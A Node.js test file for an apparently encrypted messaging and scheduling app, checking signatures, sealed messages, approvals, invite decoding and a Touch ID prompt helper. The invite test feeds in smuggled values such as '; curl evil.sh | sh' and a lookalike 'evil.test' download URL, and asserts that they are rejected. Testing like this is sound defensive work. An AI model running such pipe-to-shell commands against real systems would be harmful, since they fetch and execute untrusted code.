import test from 'node:test';
import assert from 'node:assert/strict';
import {execFileSync, spawnSync} from 'node:child_process';
import {randomBytes} from 'node:crypto';
import {existsSync} from 'node:fs';
import sodium from 'libsodium-wrappers';
import {HELPER} from '../lib/approval.mjs';
import * as w from '../lib/wire.mjs';
import {softwareApprover} from './fakes.mjs';

const person = () => w.identityFromSeed(randomBytes(32));
const message = (from, to) => ({v: 1, type: 'text', id: w.id(), from, to, thread: w.id(), parts: [from, to], seq: 1, sent: w.now(), body: {text: 'meet at the trailhead'}});

test('a signature made for one purpose never verifies for another', () => {
  const alice = person(), sig = w.signAs(alice, 'message', 'hello');
  assert.equal(w.verifyAs(alice.ik, 'message', 'hello', sig), true);
  assert.equal(w.verifyAs(alice.ik, 'request', 'hello', sig), false);
  assert.equal(w.verifyAs(alice.ik, 'message', 'hello!', sig), false);
  assert.equal(w.verifyAs(person().ik, 'message', 'hello', sig), false);
});

test('a sealed message opens only for its addressee, intact, from the claimed sender', async () => {
  const alice = person(), prekey = await w.boxKeypair(), ct = await w.seal(alice, message('alice', 'bob'), prekey.pk);
  assert.equal(w.unb64(ct).length % 1024, 48, 'padded to 1KB buckets plus the sealed-box overhead');
  const opened = await w.open(ct, prekey, {me: 'bob', from: 'alice', ik: alice.ik});
  assert.equal(opened.verified, true);
  assert.equal(opened.inner.body.text, 'meet at the trailhead');
  const tampered = w.unb64(ct);
  tampered[60] ^= 1;
  assert.equal(await w.open(w.b64(tampered), prekey, {me: 'bob', from: 'alice', ik: alice.ik}), null);
  assert.equal(await w.open(ct, await w.boxKeypair(), {me: 'bob', from: 'alice', ik: alice.ik}), null, 'another prekey cannot open it');
  assert.equal(await w.open(ct, prekey, {me: 'bob', from: 'mallory', ik: alice.ik}), null, 'relay-reported sender must match');
  assert.equal((await w.open(ct, prekey, {me: 'bob', from: 'alice', ik: person().ik})).verified, false, 'signature checked against the pinned key');
});

test('a recipient cannot forward a signed message so it looks addressed to someone else', async () => {
  await sodium.ready;
  const alice = person(), bobPrekey = await w.boxKeypair(), carolPrekey = await w.boxKeypair();
  const opened = await w.open(await w.seal(alice, message('alice', 'bob'), bobPrekey.pk), bobPrekey, {me: 'bob', from: 'alice', ik: alice.ik});
  const forwarded = w.b64(sodium.crypto_box_seal(sodium.pad(Buffer.from(JSON.stringify({m: opened.m, s: opened.signature})), 1024), w.unb64(carolPrekey.pk)));
  assert.equal(await w.open(forwarded, carolPrekey, {me: 'carol', from: 'alice', ik: alice.ik}), null);
});

test('space entries decrypt only with the right key, space and epoch', async () => {
  const alice = person(), key = await w.spaceKey();
  const sealed = await w.sealEntry(alice, key, {v: 1, id: w.id(), space: 'S'.repeat(22), epoch: 1, author: 'alice', at: w.now(), kind: 'note', text: 'meet at the trailhead at noon'});
  assert.equal((await w.openEntry(sealed, 'S'.repeat(22), key)).entry.text, 'meet at the trailhead at noon');
  assert.equal(await w.openEntry(sealed, 'S'.repeat(22), await w.spaceKey()), null);
  assert.equal(await w.openEntry({...sealed, epoch: 2}, 'S'.repeat(22), key), null);
  assert.equal(await w.openEntry(sealed, 'T'.repeat(22), key), null);
});

test('approvals bind signer, action and freshness to the approval key', async () => {
  const alice = person(), approver = softwareApprover();
  const payload = w.approvalPayload('alice', alice.ik, 'invite.create', {token_hash: 'x'.repeat(43), valid_until: w.now() + 100});
  const approval = {payload, sig: await approver.sign(payload)};
  const expect = {signer: 'alice', ik: alice.ik, ak: approver.publicKey, action: 'invite.create'};
  assert.ok(w.checkApproval(approval, expect));
  assert.equal(w.checkApproval(approval, {...expect, action: 'space.acl'}), null);
  assert.equal(w.checkApproval(approval, {...expect, signer: 'bob'}), null);
  assert.equal(w.checkApproval(approval, {...expect, ak: softwareApprover().publicKey}), null);
  assert.equal(w.checkApproval(approval, {...expect, at: w.now() + 700}), null, 'expired');
  assert.equal(w.checkApproval({payload: payload.replace('invite.create', 'handle.delete'), sig: approval.sig}, {...expect, action: 'handle.delete'}), null);
});

test('safety numbers are symmetric and change with the approval key', () => {
  const a = {handle: 'alice', ik: person().ik, ak: softwareApprover().publicKey}, b = {handle: 'bob', ik: person().ik, ak: softwareApprover().publicKey};
  assert.match(w.safetyNumber(a, b), /^(\d{5} ){11}\d{5}$/);
  assert.equal(w.safetyNumber(a, b), w.safetyNumber(b, a));
  assert.notEqual(w.safetyNumber(a, b), w.safetyNumber(a, {...b, ak: softwareApprover().publicKey}));
  assert.equal(w.tierLabel('software'), 'software key');
  assert.equal(w.tierLabel('se-biometry'), 'Touch ID');
});

test('the invite secret splits into a relay token and a separate mutual-auth key', () => {
  const keys = w.inviteKeys(randomBytes(32));
  assert.notEqual(keys.gate, w.b64(keys.mutual));
  assert.equal(keys.tokenHash, w.b64(w.sha256(keys.gate)));
  const invite = {r: 'https://relay.test', i: 'alice', s: w.b64(randomBytes(32)), f: w.fingerprint(person().ik, softwareApprover().publicKey)};
  assert.equal(w.decodeInvite(w.encodeInvite(invite)).i, 'alice');
  assert.equal(w.decodeInvite(w.encodeInvite(invite).slice(0, -4)), null);
  const sha = 'a'.repeat(64);
  assert.ok(w.decodeInvite(w.encodeInvite({...invite, p: sha, u: 'https://relay.test/dl/agentchat-0.1.0.tgz'})));
  for (const [p, u] of [[`${sha}; curl evil.sh | sh`, 'https://relay.test/dl/agentchat-0.1.0.tgz'], [sha, 'https://relay.test/dl/agentchat-0.1.0.tgz; curl evil.sh | sh'], [sha, 'https://evil.test/dl/agentchat-0.1.0.tgz'], [sha, undefined]]) {
    assert.equal(w.decodeInvite(w.encodeInvite({...invite, p, u})), null, `accepted p=${p} u=${u}`);
  }
});

test('common free time is the intersection of everyone who answered, long enough for the plan', () => {
  const window = {start: '2026-10-10T17:00:00.000Z', end: '2026-10-10T23:00:00.000Z'};
  const pranav = [{start: '2026-10-10T18:00:00Z', end: '2026-10-10T22:00:00Z'}], alex = [{start: '2026-10-10T19:30:00Z', end: '2026-10-11T02:00:00Z'}];
  assert.deepEqual(w.commonSlots(window, 120, [pranav, alex]), [{start: '2026-10-10T19:30:00.000Z', end: '2026-10-10T22:00:00.000Z'}]);
  assert.deepEqual(w.commonSlots(window, 180, [pranav, alex]), []);
  assert.deepEqual(w.commonSlots(window, 60, [pranav, []]), []);
});

const helper = (args, input) => spawnSync(HELPER, args, {input: JSON.stringify(input), encoding: 'utf8'});
const approvalFor = (action, fields) => w.approvalPayload('kavin', person().ik, action, fields);

test('the Touch ID prompt is written from the signed payload, never from the caller', {skip: process.platform !== 'darwin' || !existsSync(HELPER)}, () => {
  const space = w.id(), salt = w.id();
  const payload = approvalFor('space.acl', {space, version: 2, prev_version: 1, key_epoch: 1, members: ['kavin', 'pranav'], prev_members: ['kavin'], name_hash: w.nameHash(space, salt, 'Lake trip')});
  assert.equal(JSON.parse(helper(['render'], {payload, name: 'Lake trip', salt}).stdout).reason, 'give @pranav access to \u201CLake trip\u201D');
  assert.equal(JSON.parse(helper(['render'], {payload, name: 'Weekend errands', salt}).stdout).reason, 'give @pranav access to a shared space', 'a name that does not match the signed hash is not shown');
  const smuggled = JSON.parse(helper(['render'], {payload: payload.replace('"action"', '"reason":"approve a harmless thing","action"'), reason: 'approve a harmless thing'}).stdout).reason;
  assert.doesNotMatch(smuggled, /harmless/);
  const plan = approvalFor('plan.confirm', {thread: w.id(), plan: 'p1', title: 'Hike\u201D now; also \u201Cother\n', start: '2026-10-10T19:00:00.000Z', end: '2026-10-10T22:00:00.000Z', with: ['kavin', 'pranav']});
  assert.match(JSON.parse(helper(['render'], {payload: plan}).stdout).reason, /^confirm \u201CHike now; also other\u201D on .+ with @pranav$/);
  assert.equal(helper(['render'], {payload: approvalFor('wire.money', {})}).status, 4, 'unknown actions are refused');
  const sha = '14e7d148e67606be6e87a359f904f1665adc7ab50ba2b00f8d5bd159845318d3';
  const release = approvalFor('release.publish', {version: '0.3.1', package: 'agentchat-0.3.1.tgz', sha256: sha, size: 3451710});
  assert.equal(JSON.parse(helper(['render'], {payload: release}).stdout).reason, 'publish agentchat 0.3.1 to every Agentchat install \u00b7 sha256 14e7d148\u2026');
  assert.equal(helper(['render'], {payload: release.replace('agentchat-0.3.1.tgz', 'agentchat-9.9.9.tgz')}).status, 4, 'the package must be exactly this version');
  assert.equal(helper(['render'], {payload: release.replace(sha, 'not-a-hash')}).status, 4);
  assert.equal(helper(['render'], {payload: JSON.stringify({...JSON.parse(payload), exp: w.now() - 1})}).status, 4, 'expired payloads are refused');
});

test('the helper and the node compute the same fingerprint', {skip: process.platform !== 'darwin' || !existsSync(HELPER)}, () => {
  const ik = person().ik, ak = softwareApprover().publicKey;
  assert.equal(JSON.parse(execFileSync(HELPER, ['fingerprint', ik, ak], {encoding: 'utf8'})).fingerprint, w.fingerprint(ik, ak));
});
